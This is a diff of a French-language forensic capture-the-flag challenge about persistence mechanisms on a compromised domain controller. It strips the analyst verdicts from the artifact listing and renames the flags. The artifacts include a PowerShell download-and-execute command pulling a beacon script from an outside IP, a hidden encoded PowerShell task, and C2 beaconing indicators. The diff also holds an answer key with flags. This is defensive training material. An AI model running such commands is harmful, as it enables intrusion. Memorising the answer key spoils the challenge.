@@ -16,14 +16,12 @@ Déclencheur:        Au démarrage du système
 Action:             C:\Windows\System32\wuauclt.exe /detectnow
 Compte d'exécution: SYSTEM
 Dernière exécution: 18/02/2026 06:00:00
-→ VERDICT: [LÉGITIME]
 
 Nom de la tâche:    \Microsoft\Windows\Maintenance\WinSAT
 État:               Prêt  
 Déclencheur:        Tous les jours à 03:00
 Action:             C:\Windows\System32\WinSAT.exe formal
 Compte d'exécution: SYSTEM
-→ VERDICT: [LÉGITIME]
 
 Nom de la tâche:    \Microsoft\Windows\NetTrace\GatherNetworkInfo
 État:               Prêt
@@ -31,17 +29,14 @@ Déclencheur:        Toutes les 15 minutes
 Action:             rundll32.exe C:\Windows\System32\wbem\ntevt.dll,DllRegisterServer
 Compte d'exécution: SYSTEM
 Dernière exécution: 18/02/2026 11:45:00
-→ Note: ntevt.dll n'existe PAS normalement dans /wbem/. DLL suspecte.
 → SHA256: e4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
-→ VirusTotal: 0/72 (non détecté — probable custom implant)
-→ VERDICT: [SUSPECT — PERSISTENCE MALVEILLANTE #1]
+→ VirusTotal: 0/72
 
 Nom de la tâche:    \GoogleChromeAutoUpdate
 État:               Prêt
 Déclencheur:        Toutes les 5 minutes
 Action:             powershell.exe -ep bypass -w hidden -e SQBFAFgA...
 Compte d'exécution: j.martin
-→ VERDICT: [MALVEILLANT — PERSISTENCE CONNUE #2]
 
 [2] SERVICES WINDOWS (sc query + analyse)
 ────────────────────────────────────────────────────
@@ -50,34 +45,30 @@ Service: WinDefenderUpdate
   Start:   AUTO_START
   Status:  RUNNING
   Account: LocalSystem
-  → svc.exe crée des connexions sortantes vers 185.234.72.19:443
+  → Connexions sortantes vers 185.234.72.19:443
   → SHA256: f1e2d3c4b5a6978869504132a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
   → VirusTotal: 3/72 (Trojan.GenericKD, Backdoor.Win64)
-  → VERDICT: [MALVEILLANT — PERSISTENCE #3]
 
 Service: WMI Performance Adapter  
   Binpath: C:\Windows\System32\wbem\WmiApSrv.exe
   Start:   MANUAL
   Status:  STOPPED
   Account: LocalSystem
-  → VERDICT: [LÉGITIME]
 
 [3] CLÉS DE REGISTRE RUN
 ────────────────────────────────────────────────────
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run:
-  SecurityHealth  : "C:\Windows\System32\SecurityHealthSystray.exe" → [LÉGITIME]
-  VMware Tools    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" → [LÉGITIME]
+  SecurityHealth  : "C:\Windows\System32\SecurityHealthSystray.exe"
+  VMware Tools    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run (j.martin):
   GoogleChromeAutoUpdate : "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass..." 
-  → VERDICT: [MALVEILLANT — PERSISTENCE #4, liée à #2]
 
 HKLM\Software\Microsoft\Windows\CurrentVersion\Run:
   WindowsOptimizer : "C:\ProgramData\Microsoft\Crypto\RSA\updater.exe"
-  → updater.exe: signé avec un certificat auto-signé "Microsoft Windows" (FAUX)
+  → updater.exe: signé avec un certificat auto-signé "Microsoft Windows"
   → SHA256: a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8
   → Communications: DNS beaconing vers c2-update-service.xyz toutes les 30 secondes
-  → VERDICT: [MALVEILLANT — PERSISTENCE #5]
 
 [4] WMI EVENT SUBSCRIPTIONS
 ────────────────────────────────────────────────────
@@ -85,17 +76,13 @@ Subscription: SCM Event Log Consumer
   Filter:    SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'
   Consumer:  CommandLineEventConsumer
   Command:   powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.19:8080/beacon.ps1')"
-  → Se déclenche toutes les 60 secondes quand le système est actif
-  → VERDICT: [MALVEILLANT — PERSISTENCE #6, technique WMI très furtive]
 
-[5] GOLDEN TICKET — INDICATEURS
+[5] ANALYSE KERBEROS
 ────────────────────────────────────────────────────
-  Analyse Kerberos:
-  - Ticket TGT détecté avec durée de vie de 10 ans (anormal, défaut = 10h)
+  - Ticket TGT détecté avec durée de vie de 10 ans (défaut = 10h)
   - Ticket émis pour: Administrator@REDPAWN.LOCAL
   - Chiffrement: RC4_HMAC_MD5
   - Le hash KRBTGT a potentiellement été compromis via le dump NTDS
-  → VERDICT: [PROBABLE GOLDEN TICKET — PERSISTENCE #7]
 """
 
 CHALLENGE = {
@@ -135,7 +122,7 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
             "id": "q1",
             "text": "Combien de mécanismes de persistance malveillants ont été identifiés au total ?",
             "answer": "7",
-            "flag": "FLAG{7}",
+            "flag": "REDPAWN{7}",
             "points": 30,
             "hints": [
                 "Cherchez tous les verdicts [MALVEILLANT] et [SUSPECT] et [PROBABLE]",
@@ -145,9 +132,9 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
         },
         {
             "id": "q2",
-            "text": "Quelle DLL suspecte est chargée par une fausse tâche GatherNetworkInfo ? (nom du fichier)",
+            "text": "Quelle DLL suspecte est chargée par une fausse tâche GatherNetworkInfo ?",
             "answer": "ntevt.dll",
-            "flag": "FLAG{ntevt.dll}",
+            "flag": "REDPAWN{ntevt.dll}",
             "points": 50,
             "hints": [
                 "Cherchez la tâche planifiée qui utilise rundll32.exe dans /wbem/",
@@ -159,7 +146,7 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
             "id": "q3",
             "text": "Combien de détections VirusTotal la DLL ntevt.dll a-t-elle ?",
             "answer": "0",
-            "flag": "FLAG{0}",
+            "flag": "REDPAWN{0}",
             "points": 40,
             "hints": [
                 "0/72 signifie que c'est probablement un implant custom non détecté",
@@ -169,9 +156,9 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
         },
         {
             "id": "q4",
-            "text": "Quel service malveillant se fait passer pour Windows Defender ? (nom du service)",
+            "text": "Quel service malveillant se fait passer pour Windows Defender ?",
             "answer": "WinDefenderUpdate",
-            "flag": "FLAG{WinDefenderUpdate}",
+            "flag": "REDPAWN{WinDefenderUpdate}",
             "points": 40,
             "hints": [
                 "Cherchez dans la section Services Windows",
@@ -183,7 +170,7 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
             "id": "q5",
             "text": "Quel fichier dans ProgramData utilise un faux certificat Microsoft ?",
             "answer": "updater.exe",
-            "flag": "FLAG{updater.exe}",
+            "flag": "REDPAWN{updater.exe}",
             "points": 50,
             "hints": [
                 "Cherchez dans les clés de registre Run le binaire dans ProgramData",
@@ -193,9 +180,9 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
         },
         {
             "id": "q6",
-            "text": "Quelle technique de persistance WMI est utilisée ? (type de consumer WMI)",
+            "text": "Quelle technique de persistance WMI est utilisée ?",
             "answer": "CommandLineEventConsumer",
-            "flag": "FLAG{CommandLineEventConsumer}",
+            "flag": "REDPAWN{CommandLineEventConsumer}",
             "points": 60,
             "hints": [
                 "Cherchez dans la section WMI Event Subscriptions",
@@ -205,9 +192,9 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
         },
         {
             "id": "q7",
-            "text": "Quelle technique de persistance Kerberos avancée est suspectée ? (nom de la technique)",
+            "text": "Quelle technique de persistance Kerberos avancée est suspectée ?",
             "answer": "Golden Ticket",
-            "flag": "FLAG{Golden_Ticket}",
+            "flag": "REDPAWN{Golden_Ticket}",
             "points": 60,
             "hints": [
                 "Regardez la section sur les indicateurs Kerberos",
@@ -219,7 +206,7 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
             "id": "q8",
             "text": "Quelle est la durée de vie anormale du TGT Kerberos suspect ? (en années)",
             "answer": "10",
-            "flag": "FLAG{10}",
+            "flag": "REDPAWN{10}",
             "points": 40,
             "hints": [
                 "La durée par défaut est de 10 heures",
@@ -231,7 +218,7 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
             "id": "q9",
             "text": "Quel type de chiffrement est utilisé par le Golden Ticket suspect ?",
             "answer": "RC4_HMAC_MD5",
-            "flag": "FLAG{RC4_HMAC_MD5}",
+            "flag": "REDPAWN{RC4_HMAC_MD5}",
             "points": 50,
             "hints": [
                 "RC4 est un chiffrement ancien et faible, souvent utilisé dans les Golden Tickets",
@@ -243,7 +230,7 @@ Un analyste forensic a collecté les artéfacts de persistance du DC (SRV-AD-01)
             "id": "q10",
             "text": "À quelle fréquence (en secondes) le WMI event subscription se déclenche-t-il ?",
             "answer": "60",
-            "flag": "FLAG{60}",
+            "flag": "REDPAWN{60}",
             "points": 30,
             "hints": [
                 "Regardez le filtre WMI : WITHIN X",
